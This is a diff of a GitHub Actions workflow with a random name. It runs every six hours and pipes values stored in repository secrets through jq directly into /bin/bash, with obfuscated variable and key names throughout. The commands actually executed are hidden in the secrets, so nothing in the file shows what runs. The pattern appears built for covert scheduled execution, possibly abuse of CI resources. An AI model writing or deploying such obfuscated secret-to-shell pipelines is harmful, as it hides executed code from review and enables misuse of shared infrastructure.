@@ -2,28 +2,20 @@ name: dugubu6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 0/6 * * *'
-
+    - cron: '26 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dugubu6789
         env:
-          ldc98: ${{ secrets.ldc98 }}
+          e20307: ${{ secrets.e20307 }}
         run: |
-          echo $ldc98 | jq -r .jzbe921 | /bin/bash
-          echo $ec105 | jq -r .t13 | /bin/bash
-          echo $b64 | jq -r .lsl19745 | /bin/bash
-          echo $novw64 | jq -r .y4 | /bin/bash
-          echo $oxks0518 | jq -r .tdcly35716 | /bin/bash
-          echo $af54383 | jq -r .o06413 | /bin/bash
-          echo $tegs7 | jq -r .pk4515 | /bin/bash
-          echo $fb59738 | jq -r .mwjdk0 | /bin/bash
-          echo $xa089 | jq -r .m86 | /bin/bash
-          echo $metvk523 | jq -r .ek20876 | /bin/bash
-          echo $oxnmn0 | jq -r .efs79405 | /bin/bash
-          echo $ivkb462 | jq -r .dn25 | /bin/bash
+          echo $e20307 | jq -r .oyh573 | /bin/bash
+          echo $cbqz8 | jq -r .q3 | /bin/bash
+          echo $zhwf6 | jq -r .dmvec5404 | /bin/bash
+          echo $ytx0909 | jq -r .cll4800 | /bin/bash
+          echo $ygt87 | jq -r .eoohn793 | /bin/bash
+          echo $gvdp4 | jq -r .gusds823 | /bin/bash
 
